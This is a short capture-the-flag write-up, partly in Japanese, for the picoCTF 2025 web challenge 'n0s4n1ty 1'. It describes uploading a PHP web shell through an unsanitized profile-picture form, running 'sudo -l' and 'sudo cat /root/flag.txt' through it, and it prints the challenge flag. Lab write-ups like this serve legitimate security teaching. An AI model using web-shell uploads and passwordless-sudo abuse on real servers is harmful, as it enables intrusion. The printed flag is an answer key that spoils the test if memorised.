# n0s4n1ty 1

- **CTF:** picoCTF 2025
- **Category:** Web Exploitation
- **Difficulty:** Easy

### Description

A developer has added profile picture upload functionality to a website.
However, the implementation is flawed, and it presents an opportunity for you.
Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.

### Author
PRINCE NIYONSHUTI N.

### hint
1. File upload was not sanitized
2. Whenever you get a shell on a remote machine, `check sudo -l`

### Write-up

1.  **`shell.php`** をサーバーに **アップロードします**。

2.  アップロードしたWebシェルに `?cmd=sudo -l` を送信し、`www-data`ユーザーの`sudo`権限を **確認します**。

    ```shell
    Matching Defaults entries for www-data on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    User www-data may run the following commands on challenge:
        (ALL) NOPASSWD: ALL
    ```
    > **[重要]**
    > これにより、`www-data`ユーザーが **パスワードなしで全てのコマンド (`ALL`) を `sudo` 実行できる** ことが判明しました。これは攻撃の決定的な足がかりとなります。

3.  上記の権限を使い、`?cmd=sudo cat /root/flag.txt` を実行して、最終目的である***フラグを入手します***。

### Flag
`FLAG : picoCTF{wh47_c4n_u_d0_wPHP_d698d800}`
